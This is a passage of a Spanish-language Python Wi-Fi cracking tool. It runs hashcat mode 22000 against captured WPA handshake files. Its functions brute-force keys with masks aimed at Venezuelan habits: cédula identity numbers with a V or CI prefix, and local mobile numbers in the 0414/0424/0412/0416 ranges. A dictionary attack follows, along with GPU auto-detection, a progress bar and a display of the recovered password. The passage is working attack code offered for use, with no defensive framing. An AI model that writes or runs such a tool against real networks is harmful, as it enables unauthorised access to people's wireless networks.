        "--status-timer=1",
    ] + device_args

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        cprint("[!] hashcat no encontrado.", Colors.FAIL)
        return None

    progress_thread = threading.Thread(target=draw_progress, daemon=True)
    progress_thread.start()

    for raw_line in proc.stdout:
        line = raw_line.strip()
        if not line:
            continue

        with state_lock:
            state['result_lines'].append(line)

        # Extraer ETA de la linea de texto de hashcat
        if not state.get('saw_eta', False):
            if 'Time.Estimated' in line or 'Estimated' in line:
                match = re.search(r'\((.*?)\)', line)
                if match:
                    duration_str = match.group(1)
                    seconds = parse_duration_to_seconds(duration_str)
                    if seconds > 0:
                        with state_lock:
                            state['hashcat_eta_secs'] = seconds
                            state['saw_eta'] = True
                            state['status'] = 'Ejecutando'
                            state['start_time'] = time.time()

        if 'Bypass' in line:
            with state_lock:
                state['status'] = 'Bypass'

    proc.wait()
    rc = proc.returncode

    with state_lock:
        state['done'] = True
        if state['status'] in ('Ejecutando', 'Iniciando'):
            state['status'] = 'Agotado' if rc != 0 else 'Completado'

    progress_thread.join(timeout=2)

    # Limpiar linea de progreso y mostrar resultado final
    filled_bar = '\u2588' * 24
    elapsed_final = _fmt_time(time.time() - state['start_time'])
    print(f"\r  {Colors.CYAN}[{filled_bar}]{Colors.ENDC} {Colors.BOLD}100.00%{Colors.ENDC} "
          f"{Colors.WARNING}ETA:{Colors.ENDC}00m:00s     "
          f"{Colors.CYAN}T:{Colors.ENDC}{elapsed_final} [{state['status']}]")
    print()

    # Intentar recuperar password desde el outfile
    password = None
    if outfile.exists() and outfile.stat().st_size > 0:
        try:
            password = outfile.read_text().strip()
            with state_lock:
                state['status'] = 'Cracked!'
        except:
            pass
        try:
            outfile.unlink()
        except:
            pass

    # Si no se encontro en outfile, intentar con --show
    if not password:
        show_cmd = f"hashcat -m 22000 --show {hc22000_file}"
        stdout_show, _, _ = run_cmd(show_cmd, timeout=15)
        if stdout_show and stdout_show.strip():
            for l in stdout_show.strip().split('\n'):
                l = l.strip()
                if ':' in l and not l.startswith('Dictionary') and not l.startswith('Hashfile'):
                    parts = l.split(':')
                    if len(parts) >= 2:
                        password = parts[-1].strip()
                        break

    if password:
        cprint("\n" + "=" * 60, Colors.GREEN)
        cprint(f"  {Colors.BOLD}  CONTRASENA ENCONTRADA!{Colors.ENDC}", Colors.GREEN)
        cprint("=" * 60, Colors.GREEN)
        cprint(f"  Red:      {Colors.BOLD}{essid}{Colors.ENDC}", Colors.GREEN)
        cprint(f"  Archivo:  {hc22000_file}", Colors.GREEN)
        cprint(f"  Password: {Colors.BOLD}{password}{Colors.ENDC}", Colors.GREEN)
        cprint("=" * 60 + "\n", Colors.GREEN)
        return password
    else:
        cprint(f"\n  {Colors.WARNING}[!] No se encontro la contrasena para '{essid}'.{Colors.ENDC}", Colors.WARNING)
        cprint("  [*] La clave podria no ser numerica de 8 digitos.", Colors.WARNING)
        return None

# =============================================================================
# CRACKEAR CON HASHCAT - PATRON CEDULA DE IDENTIDAD
# =============================================================================

def crack_password_cedula(hc22000_file, essid):
    import threading

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [CEDULA] CRACKEANDO CON HASHCAT - PATRON CEDULA DE IDENTIDAD", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint("\n  Red:     " + Colors.BOLD + essid + Colors.ENDC, Colors.CYAN)
    cprint("  Archivo: " + hc22000_file, Colors.CYAN)
    cprint("  Metodo:  Fuerza bruta - Letra V/v + 8 digitos (patron: -1 Vv ?1?d?d?d?d?d?d?d?d)", Colors.CYAN)
    cprint("  Modo:    -a 3 (ataque de mascara) con optimizacion GPU", Colors.CYAN)
    cprint("  Opciones: -w 4 -D 2 --hwmon-temp-abort=95 -O (custom charset: Vv)\n", Colors.CYAN)

    # --- Auto-detectar el mejor dispositivo ---
    device_id = None
    try:
        stdout_i, _, _ = run_cmd("hashcat -I", timeout=15)
        for line in stdout_i.split('\n'):
            m = re.search(r'Backend Device ID #(\d+)', line)
            if m:
                candidate = m.group(1)
            if 'NVIDIA' in line and candidate:
                device_id = candidate
                break
    except Exception:
        pass

    if device_id is None:
        cprint("  [!] No se detecto GPU NVIDIA. Usando CPU por defecto (sin -D 2).", Colors.WARNING)
        device_args = []
    else:
        cprint("  [*] GPU detectada: NVIDIA (Device ID #" + device_id + ")", Colors.GREEN)
        device_args = ["-d", device_id]

    state_lock = threading.Lock()
    state = {
        'done': False,
        'start_time': time.time(),
        'status': 'Iniciando',
        'hashcat_eta_secs': 0,
        'saw_eta': False,
        'result_lines': [],
    }

    def _fmt_time(secs):
        if secs is None or secs < 0 or secs == float('inf'):
            return '--:--:--'
        secs = int(secs)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        return str(h) + "h:" + str(m).zfill(2) + "m:" + str(s).zfill(2) + "s" if h else str(m).zfill(2) + "m:" + str(s).zfill(2) + "s"

    def draw_progress():
        while not state['done']:
            try:
                cols = shutil.get_terminal_size((80, 20)).columns
            except Exception:
                cols = 80

            with state_lock:
                elapsed_total = time.time() - state['start_time']
                eta_base = state['hashcat_eta_secs']
                saw_eta = state['saw_eta']
                status = state['status'][:10]

            if saw_eta and eta_base > 0:
                pct = (elapsed_total / eta_base) * 100.0
                pct = min(99.5, max(pct, 0.0))
                remaining_secs = max(0, eta_base - elapsed_total)
                eta_s = _fmt_time(remaining_secs)
            else:
                pct = 0.0
                eta_s = "Calculando..."

            if cols < 80:
                bar_width = 16
            elif cols < 100:
                bar_width = 20
            else:
                bar_width = 24
            filled = int(bar_width * pct / 100.0)
            bar = '\u2588' * filled + '\u2591' * (bar_width - filled)

            elapsed_s = _fmt_time(elapsed_total)

            line = ("\r  " + Colors.CYAN + "[" + bar + "]" + Colors.ENDC + " " + Colors.BOLD + "{:6.2f}%".format(pct) + Colors.ENDC + " "
                    + Colors.WARNING + "ETA:" + Colors.ENDC + "{:>10}".format(eta_s) + " "
                    + Colors.CYAN + "T:" + Colors.ENDC + "{:>7}".format(elapsed_s) + " [" + status + "]")
            print(line + '\033[0K', end='', flush=True)
            time.sleep(0.1)

    # Archivo de salida para recuperar la password
    hc_path = Path(hc22000_file)
    outfile = hc_path.parent / (hc_path.stem + "_result.txt")

    # Cedula attack: -a 3 with V/v + 8 digits, -w 4 -D 2 --hwmon-temp-abort=95 -O
    cmd = [
        "hashcat", "-m", "22000", "-a", "3",
        hc22000_file,
        "-1", "Vv",
        "?1?d?d?d?d?d?d?d?d",
        "-w", "4",
        "-D", "2",
        "--hwmon-temp-abort=95",
        "-O",
        "--outfile", str(outfile),
        "--outfile-format=2",
        "--status",
        "--status-timer=1",
    ] + device_args

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        cprint("[!] hashcat no encontrado.", Colors.FAIL)
        return None

    progress_thread = threading.Thread(target=draw_progress, daemon=True)
    progress_thread.start()

    for raw_line in proc.stdout:
        line = raw_line.strip()
        if not line:
            continue

        with state_lock:
            state['result_lines'].append(line)

        # Extraer ETA de la linea de texto de hashcat
        if not state.get('saw_eta', False):
            if 'Time.Estimated' in line or 'Estimated' in line:
                match = re.search(r'\((.*?)\)', line)
                if match:
                    duration_str = match.group(1)
                    seconds = parse_duration_to_seconds(duration_str)
                    if seconds > 0:
                        with state_lock:
                            state['hashcat_eta_secs'] = seconds
                            state['saw_eta'] = True
                            state['status'] = 'Ejecutando'
                            state['start_time'] = time.time()

        if 'Bypass' in line:
            with state_lock:
                state['status'] = 'Bypass'

    proc.wait()
    rc = proc.returncode

    with state_lock:
        state['done'] = True
        if state['status'] in ('Ejecutando', 'Iniciando'):
            state['status'] = 'Agotado' if rc != 0 else 'Completado'

    progress_thread.join(timeout=2)

    # Limpiar linea de progreso y mostrar resultado final
    filled_bar = '\u2588' * 24
    elapsed_final = _fmt_time(time.time() - state['start_time'])
    print("\r  " + Colors.CYAN + "[" + filled_bar + "]" + Colors.ENDC + " " + Colors.BOLD + "100.00%" + Colors.ENDC + " "
          + Colors.WARNING + "ETA:" + Colors.ENDC + "00m:00s     "
          + Colors.CYAN + "T:" + Colors.ENDC + elapsed_final + " [" + state['status'] + "]")
    print()

    # Intentar recuperar password desde el outfile
    password = None
    if outfile.exists() and outfile.stat().st_size > 0:
        try:
            password = outfile.read_text().strip()
            with state_lock:
                state['status'] = 'Cracked!'
        except:
            pass
        try:
            outfile.unlink()
        except:
            pass

    # Si no se encontro en outfile, intentar con --show
    if not password:
        show_cmd = "hashcat -m 22000 --show " + hc22000_file
        stdout_show, _, _ = run_cmd(show_cmd, timeout=15)
        if stdout_show and stdout_show.strip():
            for l in stdout_show.strip().split('\n'):
                l = l.strip()
                if ':' in l and not l.startswith('Dictionary') and not l.startswith('Hashfile'):
                    parts = l.split(':')
                    if len(parts) >= 2:
                        password = parts[-1].strip()
                        break

    if password:
        cprint("\n" + "=" * 60, Colors.GREEN)
        cprint("  " + Colors.BOLD + "  CONTRASENA ENCONTRADA!" + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60, Colors.GREEN)
        cprint("  Red:      " + Colors.BOLD + essid + Colors.ENDC, Colors.GREEN)
        cprint("  Archivo:  " + hc22000_file, Colors.GREEN)
        cprint("  Password: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60 + "\n", Colors.GREEN)
        return password
    else:
        cprint("\n  " + Colors.WARNING + "[!] No se encontro la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
        cprint("  [*] La clave podria no ser numerica de 8 digitos.", Colors.WARNING)
        return None

# =============================================================================
# CRACKEAR CON HASHCAT - PATRON CEDULA CON PREFIJO CI
# =============================================================================

def crack_password_cedula_ci(hc22000_file, essid):
    import threading

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [CI] CRACKEANDO CON HASHCAT - PATRON CEDULA CON PREFIJO CI", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint("\n  Red:     " + Colors.BOLD + essid + Colors.ENDC, Colors.CYAN)
    cprint("  Archivo: " + hc22000_file, Colors.CYAN)
    cprint("  Metodo:  Fuerza bruta - Prefijo CI/ci + 8 digitos (patron: -1 cC -2 iI ?1?2?d?d?d?d?d?d?d?d)", Colors.CYAN)
    cprint("  Modo:    -a 3 (ataque de mascara) con optimizacion GPU", Colors.CYAN)
    cprint("  Opciones: -w 4 -D 2 --hwmon-temp-abort=95 -O (custom charsets: cC/iI)\n", Colors.CYAN)

    # --- Auto-detectar el mejor dispositivo ---
    device_id = None
    try:
        stdout_i, _, _ = run_cmd("hashcat -I", timeout=15)
        for line in stdout_i.split('\n'):
            m = re.search(r'Backend Device ID #(\d+)', line)
            if m:
                candidate = m.group(1)
            if 'NVIDIA' in line and candidate:
                device_id = candidate
                break
    except Exception:
        pass

    if device_id is None:
        cprint("  [!] No se detecto GPU NVIDIA. Usando CPU por defecto (sin -D 2).", Colors.WARNING)
        device_args = []
    else:
        cprint("  [*] GPU detectada: NVIDIA (Device ID #" + device_id + ")", Colors.GREEN)
        device_args = ["-d", device_id]

    state_lock = threading.Lock()
    state = {
        'done': False,
        'start_time': time.time(),
        'status': 'Iniciando',
        'hashcat_eta_secs': 0,
        'saw_eta': False,
        'result_lines': [],
    }

    def _fmt_time(secs):
        if secs is None or secs < 0 or secs == float('inf'):
            return '--:--:--'
        secs = int(secs)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        return str(h) + "h:" + str(m).zfill(2) + "m:" + str(s).zfill(2) + "s" if h else str(m).zfill(2) + "m:" + str(s).zfill(2) + "s"

    def draw_progress():
        while not state['done']:
            try:
                cols = shutil.get_terminal_size((80, 20)).columns
            except Exception:
                cols = 80

            with state_lock:
                elapsed_total = time.time() - state['start_time']
                eta_base = state['hashcat_eta_secs']
                saw_eta = state['saw_eta']
                status = state['status'][:10]

            if saw_eta and eta_base > 0:
                pct = (elapsed_total / eta_base) * 100.0
                pct = min(99.5, max(pct, 0.0))
                remaining_secs = max(0, eta_base - elapsed_total)
                eta_s = _fmt_time(remaining_secs)
            else:
                pct = 0.0
                eta_s = "Calculando..."

            if cols < 80:
                bar_width = 16
            elif cols < 100:
                bar_width = 20
            else:
                bar_width = 24
            filled = int(bar_width * pct / 100.0)
            bar = '\u2588' * filled + '\u2591' * (bar_width - filled)

            elapsed_s = _fmt_time(elapsed_total)

            line = ("\r  " + Colors.CYAN + "[" + bar + "]" + Colors.ENDC + " " + Colors.BOLD + "{:6.2f}%".format(pct) + Colors.ENDC + " "
                    + Colors.WARNING + "ETA:" + Colors.ENDC + "{:>10}".format(eta_s) + " "
                    + Colors.CYAN + "T:" + Colors.ENDC + "{:>7}".format(elapsed_s) + " [" + status + "]")
            print(line + '\033[0K', end='', flush=True)
            time.sleep(0.1)

    # Archivo de salida para recuperar la password
    hc_path = Path(hc22000_file)
    outfile = hc_path.parent / (hc_path.stem + "_result.txt")

    # CI attack: -a 3 with custom charsets -1 cC -2 iI, mask: ?1?2?d?d?d?d?d?d?d?d
    cmd = [
        "hashcat", "-m", "22000", "-a", "3",
        hc22000_file,
        "-1", "cC",
        "-2", "iI",
        "?1?2?d?d?d?d?d?d?d?d",
        "-w", "4",
        "-D", "2",
        "--hwmon-temp-abort=95",
        "-O",
        "--outfile", str(outfile),
        "--outfile-format=2",
        "--status",
        "--status-timer=1",
    ] + device_args

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        cprint("[!] hashcat no encontrado.", Colors.FAIL)
        return None

    progress_thread = threading.Thread(target=draw_progress, daemon=True)
    progress_thread.start()

    for raw_line in proc.stdout:
        line = raw_line.strip()
        if not line:
            continue

        with state_lock:
            state['result_lines'].append(line)

        # Extraer ETA de la linea de texto de hashcat
        if not state.get('saw_eta', False):
            if 'Time.Estimated' in line or 'Estimated' in line:
                match = re.search(r'\((.*?)\)', line)
                if match:
                    duration_str = match.group(1)
                    seconds = parse_duration_to_seconds(duration_str)
                    if seconds > 0:
                        with state_lock:
                            state['hashcat_eta_secs'] = seconds
                            state['saw_eta'] = True
                            state['status'] = 'Ejecutando'
                            state['start_time'] = time.time()

        if 'Bypass' in line:
            with state_lock:
                state['status'] = 'Bypass'

    proc.wait()
    rc = proc.returncode

    with state_lock:
        state['done'] = True
        if state['status'] in ('Ejecutando', 'Iniciando'):
            state['status'] = 'Agotado' if rc != 0 else 'Completado'

    progress_thread.join(timeout=2)

    # Limpiar linea de progreso y mostrar resultado final
    filled_bar = '\u2588' * 24
    elapsed_final = _fmt_time(time.time() - state['start_time'])
    print("\r  " + Colors.CYAN + "[" + filled_bar + "]" + Colors.ENDC + " " + Colors.BOLD + "100.00%" + Colors.ENDC + " "
          + Colors.WARNING + "ETA:" + Colors.ENDC + "00m:00s     "
          + Colors.CYAN + "T:" + Colors.ENDC + elapsed_final + " [" + state['status'] + "]")
    print()

    # Intentar recuperar password desde el outfile
    password = None
    if outfile.exists() and outfile.stat().st_size > 0:
        try:
            password = outfile.read_text().strip()
            with state_lock:
                state['status'] = 'Cracked!'
        except:
            pass
        try:
            outfile.unlink()
        except:
            pass

    # Si no se encontro en outfile, intentar con --show
    if not password:
        show_cmd = "hashcat -m 22000 --show " + hc22000_file
        stdout_show, _, _ = run_cmd(show_cmd, timeout=15)
        if stdout_show and stdout_show.strip():
            for l in stdout_show.strip().split('\n'):
                l = l.strip()
                if ':' in l and not l.startswith('Dictionary') and not l.startswith('Hashfile'):
                    parts = l.split(':')
                    if len(parts) >= 2:
                        password = parts[-1].strip()
                        break

    if password:
        cprint("\n" + "=" * 60, Colors.GREEN)
        cprint("  " + Colors.BOLD + "  CONTRASENA ENCONTRADA!" + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60, Colors.GREEN)
        cprint("  Red:      " + Colors.BOLD + essid + Colors.ENDC, Colors.GREEN)
        cprint("  Archivo:  " + hc22000_file, Colors.GREEN)
        cprint("  Password: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60 + "\n", Colors.GREEN)
        return password
    else:
        cprint("\n  " + Colors.WARNING + "[!] No se encontro la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
        cprint("  [*] La clave podria no ser numerica de 8 digitos.", Colors.WARNING)
        return None

# =============================================================================
# CRACKEAR CON HASHCAT - PATRON CELULAR VENEZUELA
# =============================================================================

def crack_password_celular_venezuela(hc22000_file, essid):
    import threading

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [CELULAR] CRACKEANDO CON HASHCAT - PATRON CELULAR VENEZUELA", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint("\n  Red:     " + Colors.BOLD + essid + Colors.ENDC, Colors.CYAN)
    cprint("  Archivo: " + hc22000_file, Colors.CYAN)
    cprint("  Metodo:  Fuerza bruta - Numeros celulares Venezuela (Formatos 0414, 0424, 0412, 0416)", Colors.CYAN)
    cprint("  Patron:  -1 1246 04?1?d?d?d?d?d?d?d (04 + 3er digito [1,2,4,6] + 7 digitos)", Colors.CYAN)
    cprint("  Modo:    -a 3 (ataque de mascara) con optimizacion GPU", Colors.CYAN)
    cprint("  Opciones: -w 4 -D 2 --hwmon-temp-abort=95 -O (custom charset: 1246)\n", Colors.CYAN)

    # --- Auto-detectar el mejor dispositivo ---
    device_id = None
    try:
        stdout_i, _, _ = run_cmd("hashcat -I", timeout=15)
        for line in stdout_i.split('\n'):
            m = re.search(r'Backend Device ID #(\d+)', line)
            if m:
                candidate = m.group(1)
            if 'NVIDIA' in line and candidate:
                device_id = candidate
                break
    except Exception:
        pass

    if device_id is None:
        cprint("  [!] No se detecto GPU NVIDIA. Usando CPU por defecto (sin -D 2).", Colors.WARNING)
        device_args = []
    else:
        cprint("  [*] GPU detectada: NVIDIA (Device ID #" + device_id + ")", Colors.GREEN)
        device_args = ["-d", device_id]

    state_lock = threading.Lock()
    state = {
        'done': False,
        'start_time': time.time(),
        'status': 'Iniciando',
        'hashcat_eta_secs': 0,
        'saw_eta': False,
        'result_lines': [],
    }

    def _fmt_time(secs):
        if secs is None or secs < 0 or secs == float('inf'):
            return '--:--:--'
        secs = int(secs)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        return str(h) + "h:" + str(m).zfill(2) + "m:" + str(s).zfill(2) + "s" if h else str(m).zfill(2) + "m:" + str(s).zfill(2) + "s"

    def draw_progress():
        while not state['done']:
            try:
                cols = shutil.get_terminal_size((80, 20)).columns
            except Exception:
                cols = 80

            with state_lock:
                elapsed_total = time.time() - state['start_time']
                eta_base = state['hashcat_eta_secs']
                saw_eta = state['saw_eta']
                status = state['status'][:10]

            if saw_eta and eta_base > 0:
                pct = (elapsed_total / eta_base) * 100.0
                pct = min(99.5, max(pct, 0.0))
                remaining_secs = max(0, eta_base - elapsed_total)
                eta_s = _fmt_time(remaining_secs)
            else:
                pct = 0.0
                eta_s = "Calculando..."

            if cols < 80:
                bar_width = 16
            elif cols < 100:
                bar_width = 20
            else:
                bar_width = 24
            filled = int(bar_width * pct / 100.0)
            bar = '\u2588' * filled + '\u2591' * (bar_width - filled)

            elapsed_s = _fmt_time(elapsed_total)

            line = ("\r  " + Colors.CYAN + "[" + bar + "]" + Colors.ENDC + " " + Colors.BOLD + "{:6.2f}%".format(pct) + Colors.ENDC + " "
                    + Colors.WARNING + "ETA:" + Colors.ENDC + "{:>10}".format(eta_s) + " "
                    + Colors.CYAN + "T:" + Colors.ENDC + "{:>7}".format(elapsed_s) + " [" + status + "]")
            print(line + '\033[0K', end='', flush=True)
            time.sleep(0.1)

    # Archivo de salida para recuperar la password
    hc_path = Path(hc22000_file)
    outfile = hc_path.parent / (hc_path.stem + "_result.txt")

    # Celular Venezuela attack: -a 3 with custom charset -1 1246, mask: 04?1?d?d?d?d?d?d?d
    cmd = [
        "hashcat", "-m", "22000", "-a", "3",
        hc22000_file,
        "-1", "1246",
        "04?1?d?d?d?d?d?d?d",
        "-w", "4",
        "-D", "2",
        "--hwmon-temp-abort=95",
        "-O",
        "--outfile", str(outfile),
        "--outfile-format=2",
        "--status",
        "--status-timer=1",
    ] + device_args

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        cprint("[!] hashcat no encontrado.", Colors.FAIL)
        return None

    progress_thread = threading.Thread(target=draw_progress, daemon=True)
    progress_thread.start()

    for raw_line in proc.stdout:
        line = raw_line.strip()
        if not line:
            continue

        with state_lock:
            state['result_lines'].append(line)

        if not state.get('saw_eta', False):
            if 'Time.Estimated' in line or 'Estimated' in line:
                match = re.search(r'\((.*?)\)', line)
                if match:
                    duration_str = match.group(1)
                    seconds = parse_duration_to_seconds(duration_str)
                    if seconds > 0:
                        with state_lock:
                            state['hashcat_eta_secs'] = seconds
                            state['saw_eta'] = True
                            state['status'] = 'Ejecutando'
                            state['start_time'] = time.time()

        if 'Bypass' in line:
            with state_lock:
                state['status'] = 'Bypass'

    proc.wait()
    rc = proc.returncode

    with state_lock:
        state['done'] = True
        if state['status'] in ('Ejecutando', 'Iniciando'):
            state['status'] = 'Agotado' if rc != 0 else 'Completado'

    progress_thread.join(timeout=2)

    filled_bar = '\u2588' * 24
    elapsed_final = _fmt_time(time.time() - state['start_time'])
    print("\r  " + Colors.CYAN + "[" + filled_bar + "]" + Colors.ENDC + " " + Colors.BOLD + "100.00%" + Colors.ENDC + " "
          + Colors.WARNING + "ETA:" + Colors.ENDC + "00m:00s     "
          + Colors.CYAN + "T:" + Colors.ENDC + elapsed_final + " [" + state['status'] + "]")
    print()

    password = None
    if outfile.exists() and outfile.stat().st_size > 0:
        try:
            password = outfile.read_text().strip()
            with state_lock:
                state['status'] = 'Cracked!'
        except:
            pass
        try:
            outfile.unlink()
        except:
            pass

    if not password:
        show_cmd = "hashcat -m 22000 --show " + hc22000_file
        stdout_show, _, _ = run_cmd(show_cmd, timeout=15)
        if stdout_show and stdout_show.strip():
            for l in stdout_show.strip().split('\n'):
                l = l.strip()
                if ':' in l and not l.startswith('Dictionary') and not l.startswith('Hashfile'):
                    parts = l.split(':')
                    if len(parts) >= 2:
                        password = parts[-1].strip()
                        break

    if password:
        cprint("\n" + "=" * 60, Colors.GREEN)
        cprint("  " + Colors.BOLD + "  CONTRASENA ENCONTRADA!" + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60, Colors.GREEN)
        cprint("  Red:      " + Colors.BOLD + essid + Colors.ENDC, Colors.GREEN)
        cprint("  Archivo:  " + hc22000_file, Colors.GREEN)
        cprint("  Password: " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60 + "\n", Colors.GREEN)
        return password
    else:
        cprint("\n  " + Colors.WARNING + "[!] No se encontro la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
        cprint("  [*] La clave podria no ser un numero de celular venezolano.", Colors.WARNING)
        return None


# =============================================================================
# CRACKEAR CON HASHCAT - ATAQUE CON DICCIONARIO
# =============================================================================

def crack_password_diccionario(hc22000_file, essid, diccionario_path):
    import threading

    cprint("\n" + "=" * 60, Colors.HEADER)
    cprint("  [DICCIONARIO] CRACKEANDO CON HASHCAT - ATAQUE CON DICCIONARIO", Colors.HEADER)
    cprint("=" * 60, Colors.HEADER)

    cprint("\n  Red:        " + Colors.BOLD + essid + Colors.ENDC, Colors.CYAN)
    cprint("  Archivo:    " + hc22000_file, Colors.CYAN)
    cprint("  Diccionario:" + diccionario_path, Colors.CYAN)
    cprint("  Metodo:     -a 0 (ataque con diccionario)", Colors.CYAN)
    cprint("  Opciones:   -w 4 -D 2 --hwmon-temp-abort=95 -O\n", Colors.CYAN)

    # --- Auto-detectar el mejor dispositivo ---
    device_id = None
    try:
        stdout_i, _, _ = run_cmd("hashcat -I", timeout=15)
        for line in stdout_i.split('\n'):
            m = re.search(r'Backend Device ID #(\d+)', line)
            if m:
                candidate = m.group(1)
            if 'NVIDIA' in line and candidate:
                device_id = candidate
                break
    except Exception:
        pass

    if device_id is None:
        cprint("  [!] No se detecto GPU NVIDIA. Usando CPU por defecto (sin -D 2).", Colors.WARNING)
        device_args = []
    else:
        cprint("  [*] GPU detectada: NVIDIA (Device ID #" + device_id + ")", Colors.GREEN)
        device_args = ["-d", device_id]

    state_lock = threading.Lock()
    state = {
        'done': False,
        'start_time': time.time(),
        'status': 'Iniciando',
        'hashcat_eta_secs': 0,
        'saw_eta': False,
        'result_lines': [],
    }

    def _fmt_time(secs):
        if secs is None or secs < 0 or secs == float('inf'):
            return '--:--:--'
        secs = int(secs)
        h, m, s = secs // 3600, (secs % 3600) // 60, secs % 60
        return str(h) + "h:" + str(m).zfill(2) + "m:" + str(s).zfill(2) + "s" if h else str(m).zfill(2) + "m:" + str(s).zfill(2) + "s"

    def draw_progress():
        while not state['done']:
            try:
                cols = shutil.get_terminal_size((80, 20)).columns
            except Exception:
                cols = 80

            with state_lock:
                elapsed_total = time.time() - state['start_time']
                eta_base = state['hashcat_eta_secs']
                saw_eta = state['saw_eta']
                status = state['status'][:10]

            if saw_eta and eta_base > 0:
                pct = (elapsed_total / eta_base) * 100.0
                pct = min(99.5, max(pct, 0.0))
                remaining_secs = max(0, eta_base - elapsed_total)
                eta_s = _fmt_time(remaining_secs)
            else:
                pct = 0.0
                eta_s = "Calculando..."

            if cols < 80:
                bar_width = 16
            elif cols < 100:
                bar_width = 20
            else:
                bar_width = 24
            filled = int(bar_width * pct / 100.0)
            bar = '\u2588' * filled + '\u2591' * (bar_width - filled)

            elapsed_s = _fmt_time(elapsed_total)

            line = ("\r  " + Colors.CYAN + "[" + bar + "]" + Colors.ENDC + " " + Colors.BOLD + "{:6.2f}%".format(pct) + Colors.ENDC + " "
                    + Colors.WARNING + "ETA:" + Colors.ENDC + "{:>10}".format(eta_s) + " "
                    + Colors.CYAN + "T:" + Colors.ENDC + "{:>7}".format(elapsed_s) + " [" + status + "]")
            print(line + '\033[0K', end='', flush=True)
            time.sleep(0.1)

    # Archivo de salida para recuperar la password
    hc_path = Path(hc22000_file)
    outfile = hc_path.parent / (hc_path.stem + "_result.txt")

    # Dictionary attack: -a 0 with wordlist
    cmd = [
        "hashcat", "-m", "22000", "-a", "0",
        hc22000_file,
        diccionario_path,
        "-w", "4",
        "-D", "2",
        "--hwmon-temp-abort=95",
        "-O",
        "--outfile", str(outfile),
        "--outfile-format=2",
        "--status",
        "--status-timer=1",
    ] + device_args

    try:
        proc = subprocess.Popen(
            cmd,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
    except FileNotFoundError:
        cprint("[!] hashcat no encontrado.", Colors.FAIL)
        return None

    progress_thread = threading.Thread(target=draw_progress, daemon=True)
    progress_thread.start()

    for raw_line in proc.stdout:
        line = raw_line.strip()
        if not line:
            continue

        with state_lock:
            state['result_lines'].append(line)

        if not state.get('saw_eta', False):
            if 'Time.Estimated' in line or 'Estimated' in line:
                match = re.search(r'\((.*?)\)', line)
                if match:
                    duration_str = match.group(1)
                    seconds = parse_duration_to_seconds(duration_str)
                    if seconds > 0:
                        with state_lock:
                            state['hashcat_eta_secs'] = seconds
                            state['saw_eta'] = True
                            state['status'] = 'Ejecutando'
                            state['start_time'] = time.time()

        if 'Bypass' in line:
            with state_lock:
                state['status'] = 'Bypass'

    proc.wait()
    rc = proc.returncode

    with state_lock:
        state['done'] = True
        if state['status'] in ('Ejecutando', 'Iniciando'):
            state['status'] = 'Agotado' if rc != 0 else 'Completado'

    progress_thread.join(timeout=2)

    filled_bar = '\u2588' * 24
    elapsed_final = _fmt_time(time.time() - state['start_time'])
    print("\r  " + Colors.CYAN + "[" + filled_bar + "]" + Colors.ENDC + " " + Colors.BOLD + "100.00%" + Colors.ENDC + " "
          + Colors.WARNING + "ETA:" + Colors.ENDC + "00m:00s     "
          + Colors.CYAN + "T:" + Colors.ENDC + elapsed_final + " [" + state['status'] + "]")
    print()

    password = None
    if outfile.exists() and outfile.stat().st_size > 0:
        try:
            password = outfile.read_text().strip()
            with state_lock:
                state['status'] = 'Cracked!'
        except:
            pass
        try:
            outfile.unlink()
        except:
            pass

    if not password:
        show_cmd = "hashcat -m 22000 --show " + hc22000_file
        stdout_show, _, _ = run_cmd(show_cmd, timeout=15)
        if stdout_show and stdout_show.strip():
            for l in stdout_show.strip().split('\n'):
                l = l.strip()
                if ':' in l and not l.startswith('Dictionary') and not l.startswith('Hashfile'):
                    parts = l.split(':')
                    if len(parts) >= 2:
                        password = parts[-1].strip()
                        break

    if password:
        cprint("\n" + "=" * 60, Colors.GREEN)
        cprint("  " + Colors.BOLD + "  CONTRASENA ENCONTRADA!" + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60, Colors.GREEN)
        cprint("  Red:        " + Colors.BOLD + essid + Colors.ENDC, Colors.GREEN)
        cprint("  Archivo:    " + hc22000_file, Colors.GREEN)
        cprint("  Diccionario:" + diccionario_path, Colors.GREEN)
        cprint("  Password:   " + Colors.BOLD + password + Colors.ENDC, Colors.GREEN)
        cprint("=" * 60 + "\n", Colors.GREEN)
        return password
    else:
        cprint("\n  " + Colors.WARNING + "[!] No se encontro la contrasena para '" + essid + "'." + Colors.ENDC, Colors.WARNING)
        cprint("  [*] La clave no se encontro en el diccionario seleccionado.", Colors.WARNING)
        return None


